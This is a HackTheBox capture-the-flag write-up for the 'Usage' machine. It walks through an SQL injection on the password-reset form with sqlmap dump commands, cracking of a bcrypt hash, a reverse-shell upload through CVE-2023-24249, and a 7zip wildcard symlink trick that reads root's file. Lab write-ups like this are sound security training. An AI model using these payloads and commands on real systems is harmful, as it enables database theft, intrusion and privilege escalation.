---
title: Usage
tags:
  - Linux
  - CVE
  - Wildcard
  - HackTheBox
  - Easy
date: 2024-05-01T00:00:00Z
---
![](Pasted%20image%2020240501234511.png)

## Reconnaissance

Firstly, I added the new host to my known ones:

```shell
sudo echo "10.10.11.18 usage.htb" | sudo tee -a /etc/hosts
```

Secondly, I started performing an `Nmap` scan with:

```shell
nmap -sC -T4 -p- usage.htb > sC.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 22:05 CEST
Nmap scan report for usage.htb (10.10.11.18)
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http
|_http-title: Daily Blogs

Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
```

Then I tried to use dirsearch but found nothing interesting, so I decided to read the code. While doing this I visualized another domain: `admin.usage.htb`, 

![](Pasted%20image%2020240501234847.png)

so I added it to the known hosts:

```shell
sudo echo "10.10.11.18 admin.usage.htb" | sudo tee -a /etc/hosts
```

When I visited the new domain I found an admin login panel:

![](Pasted%20image%2020240501235015.png)

Then I tried to do a login bypass but I didn't get anything 🤕.
After searching quite a lot I tried the "Reset password" option of the main domain (having created an account before doing it) and then I performed manual sql injections. The one successful was:

```sql
example@example.test' AND 1==1;--
```

So I captured the request with **Burpsuite**:

```html
POST /forget-password HTTP/1.1
Host: usage.htb
Content-Length: 96
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usage.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Referer: http://usage.htb/forget-password
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6IkpVektaMURBeHJia1ZZeVpCdDhsTkE9PSIsInZhbHVlIjoiTmhkVU5lRm9zSkFNNTNGQzlxRDZMY2ZNTytBNEVaeHk0S3FNdzd4NkhqWjVlTDRDQUpJZ3lCUmRDQVFtN0pkN3p2Y2QwQklmRC81a3FyRWw3SG9ibllmZUtORHFMRHl4RkljK1doK3pkd1RCOG1UNkZkWDFKbUhBM01mcWYyWEoiLCJtYWMiOiJjMmY3YmJhYjI0ZTZhMjgwYzVkZmNhZmE0NTQyMjY5MGIwMWFmOWVlMGY3N2ExNDY5YzA1N2ZiOGM5YWU2YzY5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkUvOVFmWllQZmhhTzdiS3ZSalMzM0E9PSIsInZhbHVlIjoiUFgwV0dqN0h2aWNGczViZmRDU08vZkNMOERnRUZuQ2RLaEd5REJUZGNxaVVzR1lqOWt2MnhDTCtHd29qNDY2dU10R3YvbStRUmV2RitpcE5JNk5xbVB0Vnd2WHNlWjBiV3p1QW4zc3BPSlB1WnZuNVFsZXh1cXNwNUpjeDRMU28iLCJtYWMiOiI3MmQ3NWI0YjhmMzQ4NTFjM2Q5M2M5ODBhMjNlZjI4M2M0MmI2OWI2ZjEzNjk4MDIzYmE4ZGJmYjQ4Mjc3MWNjIiwidGFnIjoiIn0%3D
Connection: close

_token=VKIqVeHHgY3azyNB5HmGBngdHk5IPZgiB5srIcBU&email=example@example.test
```

and decided to use SQLMap to automate the process:
- Visit [SQLMap 🪲](/notes/tools/Sqlmap.md) note for more commands
- As I know that AND worked, I used BUT technique

```shell
sqlmap -r request.txt -p 'email' --dbms=mysql --level=3 --risk=3 --batch --technique=BUT --dbs --dump --threads 3

sqlmap -r request.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --technique=BUT --batch --threads 3 -D usage_blog -T admin_users  --dump

sqlmap -r request.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --technique=BUT --batch --threads 3 -D usage_blog -T admin_users -C name,username,password --dump
```

 I obtained this creds: `admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`, so it was time for brute forcing.

First I checked what kind of hash was it in [hashes.com](https://hashes.com/en/tools/hash_identifier)

Then I decided to use John the Ripper for this:

```shell
john hash.txt --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
```

After gaining the password, I logged into the initial admin domain:

![](Pasted%20image%2020240502000034.png)

## Weaponization

After a bit of research I found the [CVE-2023-24249](https://flyd.uk/post/cve-2023-24249/

## Exploitation

First, I created in my local machine an image with a php code inside of it like:
- Check [Reverse shells 👾](/notes/reverse_shells.md) for the shell

```shell
echo "shell..." > shell.jpg
```

Then I went to the `Administrator >> Setting` at top right on the screen

![](Pasted%20image%2020240502000359.png)

Now what I did was to catch the request of changing the image with burpsuite by the one I previously created and modified the following:

![](Pasted%20image%2020240502000602.png)

![](Pasted%20image%2020240502000625.png)

And then I got the reverse shell :D


### User flag

```shell
cat /home/dash/user.txt
XXXXXXXXXXXXXXXXXXXXXX
```

## Privilege Escalation

First of all, I pivoted to the other user account, `xander`. To do it, I observed the hidden file `.monitrc` and found the credentials of `xander`.

After loggin as him, I performed:

```shell
sudo -l

Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

So I executed the program and, after arriving to the conclusion of being a 7zip performing a backup using a wildcard, I decided to use this in my favour:

```shell
cd /var/www/html/
touch '@root.txt'
ln -s -r /root/root.txt root.txt
sudo /usr/bin/usage_management # and select the 1st option
```

### Root flag

was obtained in the previous exit of the program

==Machine pwned==

